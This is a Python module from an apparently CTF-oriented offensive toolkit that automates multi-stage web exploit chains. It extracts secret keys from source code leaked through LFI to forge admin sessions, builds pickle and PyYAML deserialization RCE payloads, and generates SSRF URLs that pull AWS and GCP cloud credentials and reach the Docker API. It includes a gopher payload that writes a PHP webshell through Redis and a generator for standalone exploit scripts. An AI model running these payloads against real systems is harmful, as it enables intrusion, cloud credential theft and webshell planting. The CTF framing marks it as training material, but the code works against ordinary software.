"""
Multi-Stage Vulnerability Chaining Engine for WebCTF Suite.
Correlates discovered vulnerabilities (LFI, SSRF, SQLi, Auth, Deserialization, SSTI)
and automates multi-step exploit pipelines from initial leak to root/container escape.
"""

import re
import base64
import urllib.parse
from typing import Dict, List, Any, Optional
from modules.jwt_tool import forge_alg_none, sign_jwt_hs256
from modules.deserializer import generate_pickle_payload, generate_nodejs_serialize_payload, generate_pyyaml_payload
from modules.container_escape import ContainerEscapeAdvisor

class VulnerabilityChainEngine:
    """
    Manages multi-hop offensive workflows, state correlation, and exploit script generation.
    """

    # ─── LFI TO RCE & SECRET EXPLOIT CHAIN ──────────────────────────────
    @staticmethod
    def analyze_lfi_source_leak_for_chains(target_url: str, lfi_param: str, leaked_files: Dict[str, str]) -> List[Dict[str, Any]]:
        """
        Scan leaked source code files to build automated secondary exploitation chains.
        """
        chains = []

        for fname, code in leaked_files.items():
            # 1. Flask / Django SECRET_KEY Discovery -> Session Forgery
            secret_match = re.search(r"SECRET_KEY\s*=\s*['\"]([^'\"]+)['\"]", code, re.IGNORECASE)
            if secret_match:
                secret = secret_match.group(1)
                chains.append({
                    "chain_name": "LFI -> Secret Leak -> Session Forgery",
                    "source_file": fname,
                    "extracted_secret": secret,
                    "impact": "High (Session Forgery / Admin Elevation)",
                    "action": f"Sign forged cookies using secret key: '{secret}' to access administrative endpoints.",
                    "recipe": [
                        f"1. Leaked {fname} via LFI parameter '{lfi_param}'",
                        f"2. Extracted SECRET_KEY: '{secret}'",
                        "3. Forge authenticated cookie (e.g. {'user': 'admin', 'is_admin': True})",
                        f"4. Send authenticated request to {target_url}/admin"
                    ]
                })

            # 2. Insecure Deserialization Sink Discovery
            if "pickle.loads" in code or "_pickle.loads" in code:
                # Find parameter name deserialized
                param_match = re.search(r"pickle\.loads\([^)]*request\.(?:args|form|cookies)\[['\"]([^'\"]+)['\"]\]", code)
                deser_param = param_match.group(1) if param_match else "data"
                pickle_pay = generate_pickle_payload("cat /flag* || cat /flag.txt")
                chains.append({
                    "chain_name": "LFI -> Code Audit -> Python Pickle Deserialization RCE",
                    "source_file": fname,
                    "sink_parameter": deser_param,
                    "impact": "Critical (Remote Code Execution)",
                    "action": f"Inject base64 pickle payload into parameter '{deser_param}'",
                    "payload": pickle_pay["Base64 Payload"],
                    "recipe": [
                        f"1. Leaked {fname} via LFI parameter '{lfi_param}'",
                        f"2. Discovered insecure pickle.loads() sink on parameter '{deser_param}'",
                        "3. Craft serialized _PickleRCE payload executing 'cat /flag*'",
                        f"4. Send payload via curl: curl '{target_url}?{deser_param}={pickle_pay['Base64 Payload']}'"
                    ]
                })

            elif "yaml.load" in code or "yaml.unsafe_load" in code:
                param_match = re.search(r"yaml\.(?:unsafe_)?load\([^)]*request\.(?:args|form|cookies)\[['\"]([^'\"]+)['\"]\]", code)
                deser_param = param_match.group(1) if param_match else "yaml"
                yaml_pay = generate_pyyaml_payload("cat /flag*")["Default Payload"]
                chains.append({
                    "chain_name": "LFI -> Code Audit -> PyYAML Deserialization RCE",
                    "source_file": fname,
                    "sink_parameter": deser_param,
                    "impact": "Critical (Remote Code Execution)",
                    "action": f"Inject PyYAML payload into parameter '{deser_param}'",
                    "payload": yaml_pay,
                    "recipe": [
                        f"1. Leaked {fname} via LFI parameter '{lfi_param}'",
                        f"2. Discovered unsafe yaml.load() sink on parameter '{deser_param}'",
                        f"3. Craft PyYAML RCE payload: {yaml_pay}",
                        f"4. Send POST/GET request to trigger remote command execution"
                    ]
                })

            elif "unserialize(" in code:
                chains.append({
                    "chain_name": "LFI -> Code Audit -> PHP Object Injection / POP Chain",
                    "source_file": fname,
                    "impact": "High / Critical (PHP Object Injection)",
                    "action": "Audit class definitions in source code for __destruct, __wakeup, or __toString magic methods.",
                    "recipe": [
                        f"1. Leaked {fname} via LFI parameter '{lfi_param}'",
                        "2. Identified unserialize() sink",
                        "3. Construct serialized object payload targeting destructors or wakeup bypass (CVE-2016-7124)"
                    ]
                })

        return chains

    # ─── SSRF TO CLOUD & INTERNAL INFRASTRUCTURE CHAIN ─────────────────
    @staticmethod
    def generate_ssrf_cloud_chains(target_url: str, ssrf_param: str) -> List[Dict[str, str]]:
        """
        Generate multi-step cloud metadata & internal API SSRF extraction chains.
        """
        return [
            {
                "Target": "AWS EC2 IMDSv1 Metadata (IAM Keys)",
                "Probe URL": f"{target_url}?{ssrf_param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "Description": "Extracts temporary AWS IAM access keys, secret keys, and tokens."
            },
            {
                "Target": "AWS EC2 IMDSv2 Token Fetch",
                "Probe URL": f"{target_url}?{ssrf_param}=http://169.254.169.254/latest/api/token",
                "Description": "Fetches IMDSv2 session token with 'X-aws-ec2-metadata-token-ttl-seconds: 21600'."
            },
            {
                "Target": "GCP Compute Engine Metadata",
                "Probe URL": f"{target_url}?{ssrf_param}=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "Description": "Extracts GCP service account OAuth2 tokens (requires Metadata-Flavor: Google header)."
            },
            {
                "Target": "Internal Docker API Remote Exec",
                "Probe URL": f"{target_url}?{ssrf_param}=http://127.0.0.1:2375/containers/json",
                "Description": "Queries unauthenticated Docker daemon API on port 2375 to spawn containers."
            },
            {
                "Target": "Internal Redis RCE (Gopher / HTTP Pipeline)",
                "Probe URL": f"{target_url}?{ssrf_param}=gopher://127.0.0.1:6379/_flushall%0D%0ASET%20pwn%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE",
                "Description": "Writes PHP webshell via Redis unauthenticated TCP socket."
            }
        ]

    # ─── REPRODUCIBLE PYTHON EXPLOIT SCRIPT GENERATOR ──────────────────
    @staticmethod
    def generate_python_exploit_script(chain_info: Dict[str, Any]) -> str:
        """
        Produce a clean, standalone, reproducible Python exploit script for a completed chain.
        """
        c_name = chain_info.get("chain_name", "WebCTF Exploit Chain")
        recipe = chain_info.get("recipe", [])
        payload = chain_info.get("payload", "")
        
        script = f'''#!/usr/bin/env python3
"""
Automated Exploit Script: {c_name}
Generated by WebCTF Suite Chaining Engine
"""

import requests
import sys

def pwn():
    target = "{chain_info.get('target_url', 'http://127.0.0.1:8080')}"
    print("[*] Launching Exploit Chain: {c_name}")
'''
        for step in recipe:
            script += f"    print(\"[*] {step}\")\n"

        if payload:
            sink_param = chain_info.get("sink_parameter", "data")
            script += f'''
    payload = """{payload}"""
    print("[*] Sending payload to target...")
    # Example request
    r = requests.get(target, params={{"{sink_param}": payload}}, timeout=10)
    print(f"[+] Server Response ({{r.status_code}}):")
    print(r.text[:500])
'''

        script += '''
if __name__ == "__main__":
    pwn()
'''
        return script
